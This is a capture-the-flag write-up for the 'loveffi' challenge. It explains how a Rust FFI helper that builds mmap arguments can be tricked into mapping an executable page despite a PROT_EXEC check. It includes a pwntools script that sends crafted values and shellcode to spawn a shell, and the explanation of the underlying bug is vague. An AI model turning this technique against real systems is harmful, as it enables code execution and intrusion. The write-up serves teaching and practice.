# loveffi

This challenge involves something known as "foreign function interface" and uses an external library written in rust to get the arguments for the `mmap` function in C. The `mmap_args` function is this:
```rust
pub extern "C" fn mmap_args() -> MmapArgs {
    let args = MmapArgs {
        addr: read::<u64>(),
        length: read::<u64>(),
        protection: read::<u32>(),
        flags: read::<u32>(),
        fd: read::<u32>(),
        offset: read::<u64>(),
    };

    if args.protection & 4 != 0 {
        panic!("PROT_EXEC not allowed");
    }

    args
}
```
The read function has a custom implementation, basically it flushes stdout, prints a prompt, reads a line and removes newline. We see that we are not allowed to mmap a page as executable because of the check.

The bug here is very subtle and hard to understand exactly but the read function parses input such that value of `args.protection` can be set as 0 but the actual memory address has `7` which results in the page being marked as executable when mmaped and we can simply run shellcode to get a shell.

```python
from pwn import *
context.arch = "amd64"

io = process("./chal")
# io = remote("amt.rs", 31172)

io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"4096")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"456")
io.sendlineafter(b"> ", b"0")
io.sendlineafter(b"> ", b"7")

payload = asm(shellcraft.sh())
io.sendline(payload)

io.sendlineafter(b"> ", b"0")

io.interactive()
```